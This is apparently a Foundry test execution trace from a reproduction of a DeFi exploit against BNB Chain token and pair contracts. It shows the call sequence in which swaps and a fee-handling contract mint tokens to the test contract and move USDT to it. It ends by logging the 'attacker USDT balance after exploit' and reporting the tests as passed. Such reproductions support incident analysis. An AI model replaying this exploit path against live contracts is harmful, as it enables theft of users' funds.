    │   ├─ [117692] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::swap(0, 110131984045575168218456 [1.101e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [1433] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125) [staticcall]
    │   │   │   ├─ [602] 0xEfADce528668B7315887220fD539842BC6E6f964::isRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0x55d398326f99059fF775485246999027B3197955) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0x55d398326f99059fF775485246999027B3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1881] 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C::calcFee(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 1, 110131984045575168218456 [1.101e23]) [staticcall]
    │   │   │   ├─ [1041] 0xE932fB810dad56d2aE5a9c52114e7992ADDC9b53::calcFee(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 1, 110131984045575168218456 [1.101e23]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000012a836a4f4272c7eaaa
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000012a836a4f4272c7eaaa
    │   │   ├─ [23171] 0x55d398326f99059fF775485246999027B3197955::transfer(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C, 5506599202278758410922 [5.506e21])
    │   │   │   ├─ emit Transfer(from: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, to: 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C, value: 5506599202278758410922 [5.506e21])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [42571] 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C::92a6d507(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000012a836a4f4272c7eaaa0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   │   ├─ [41728] 0xE932fB810dad56d2aE5a9c52114e7992ADDC9b53::92a6d507(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000012a836a4f4272c7eaaa0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [delegatecall]
    │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C) [staticcall]
    │   │   │   │   │   └─ ← [Return] 5506599202278758410922 [5.506e21]
    │   │   │   │   ├─ [602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [1234] 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F::token0() [staticcall]
    │   │   │   │   │   ├─ [406] 0xDAdb8175036D6e9C73F32eaeCD81161Fe71A9023::token0() [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000002fd6ba48e977ff38bf9c43a9ba9dac72a1f88195
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000002fd6ba48e977ff38bf9c43a9ba9dac72a1f88195
    │   │   │   │   ├─ [12154] 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F::getReserves() [staticcall]
    │   │   │   │   │   ├─ [11320] 0xDAdb8175036D6e9C73F32eaeCD81161Fe71A9023::getReserves() [delegatecall]
    │   │   │   │   │   │   ├─ [9681] 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F::56f1a1c7() [staticcall]
    │   │   │   │   │   │   │   ├─ [8853] 0xDAdb8175036D6e9C73F32eaeCD81161Fe71A9023::56f1a1c7() [delegatecall]
    │   │   │   │   │   │   │   │   ├─ [338] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::totalSupply() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 5659307738012780028446 [5.659e21]
    │   │   │   │   │   │   │   │   ├─ [602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0xEb1aDf8A02af7D5CF4ff6875c6fFa1340a346D86) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   ├─ [602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   ├─ [602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   ├─ [602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x0000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000132caac036cd72f621e
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000132caac036cd72f621e
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000132caac036cd72f621e00000000000000000000000000000000000000000000013a475e179b3d3448b400000000000000000000000000000000000000000000000000000000630b871e
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000132caac036cd72f621e00000000000000000000000000000000000000000000013a475e179b3d3448b400000000000000000000000000000000000000000000000000000000630b871e
    │   │   │   │   ├─ [3146] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4837873484744719960796 [4.837e21])
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4837873484744719960796 [4.837e21])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F, 5506599202278758410922 [5.506e21])
    │   │   │   │   │   ├─ emit Transfer(from: 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C, to: 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F, value: 5506599202278758410922 [5.506e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [8748] 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F::sync()
    │   │   │   │   │   ├─ [7923] 0xDAdb8175036D6e9C73F32eaeCD81161Fe71A9023::sync() [delegatecall]
    │   │   │   │   │   │   ├─ [602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 11304019415203575509854 [1.13e22]
    │   │   │   │   │   │   ├─ emit Sync(: 1000000000000000000 [1e18], : 11304019415203575509854 [1.13e22])
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   └─ ← [Return] 
    │   │   │   │   ├─ [602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─  emit topic 0: 0x87901625e4a593dc7d577a4950dede9d34964f83c41a8dd560a713aad237ea58
    │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │        topic 2: 0x0000000000000000000000008672cfb5f822c38d9023c84cbbbf4471acd5c93c
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000012a836a4f4272c7eaaa0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   ├─ [23171] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 104625384843296409807534 [1.046e23])
    │   │   │   ├─ emit Transfer(from: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 104625384843296409807534 [1.046e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [1236] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::balanceOf(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0) [staticcall]
    │   │   │   └─ ← [Return] 470793645325787035796 [4.707e20]
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0) [staticcall]
    │   │   │   └─ ← [Return] 235
    │   │   ├─ emit Sync(: 470793645325787035796 [4.707e20], : 235)
    │   │   ├─ emit Swap(param0: 0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125, param1: 470793645325787035795 [4.707e20], param2: 0, param3: 0, param4: 110131984045575168218456 [1.101e23], param5: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [958] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::reflowDistributeFee(0)
    │   │   └─ ← [Stop] 
    │   ├─ [958] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::reflowDistributeFee(1)
    │   │   └─ ← [Stop] 
    │   ├─ [958] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::reflowDistributeFee(2)
    │   │   └─ ← [Stop] 
    │   ├─ [958] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::reflowDistributeFee(3)
    │   │   └─ ← [Stop] 
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000001c5b86ea47ba32f7c0000000000000000000000000000000000000000000001752444e3130f79e5558
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 104625384843296409807534 [1.046e23]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT balance after exploit", val: 104625384843296409807534 [1.046e23], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.13s (6.79s CPU time)

Ran 2 test suites in 7.51s (7.47s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
